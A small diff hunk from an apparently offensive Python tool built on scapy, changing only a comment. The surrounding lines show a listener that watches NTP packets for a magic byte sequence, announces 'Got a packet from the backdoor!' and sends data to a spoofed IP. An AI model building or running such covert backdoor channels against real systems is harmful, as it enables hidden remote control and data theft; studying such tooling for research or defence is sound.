@@ -67,7 +67,7 @@ def main():
             ip_packet = packet[0][IP]
             raw_packet = scapy.raw(ntp_packet)
 
-            # If got a malicious packet - Activate the backdoor and activate
+            # If got a malicious packet - Activate the backdoor!
             if raw_packet[START_MALICIOUS_MAGIC:END_MALICIOUS_MAGIC] == MALICIOUS_MAGIC:
                 print("[ + ] Got a packet from the backdoor!\n[ ! ] Entering sandman...")
                 send_data(sys.argv[2], ip_packet, spoofed_ip)
